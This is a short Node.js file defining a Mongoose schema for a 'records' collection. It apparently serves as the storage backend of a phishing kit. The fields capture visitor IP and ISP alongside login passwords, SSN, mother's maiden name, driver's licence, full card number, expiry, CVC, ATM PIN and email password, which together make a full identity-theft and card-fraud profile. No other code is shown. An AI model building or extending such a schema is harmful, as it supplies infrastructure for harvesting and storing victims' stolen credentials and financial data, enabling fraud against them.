const mongoose = require('mongoose'); 

const Records = new mongoose.Schema(

    {
        visitor_id:{type: String, unique: false},
        ip:{type: String, unique: false},
        state:{type: String, unique: false},
        country:{type: String, unique: false},
        isp:{type: String, unique: false},
        userid:{type: String, unique: false},
        password:{type: String, unique: false},
        fullName:{type: String, unique: false},
        dob:{type: String, unique: false},
        ssn:{type: String, unique: false},
        mmn:{type: String, unique: false},
        dl:{type: String, unique: false},
        card_number:{type: String, unique: false},
        valid_thru:{type: String, unique: false},
        card_name:{type: String, unique: false},
        cvc:{type: String, unique: false},
        atm_pin:{type: String, unique: false},
        address:{type: String, unique: false},
        email:{type: String, unique: false},
        email_password:{type: String, unique: false},

    },

    { collection: 'records'}
)

const model = mongoose.model('Records', Records)

module.exports = model; 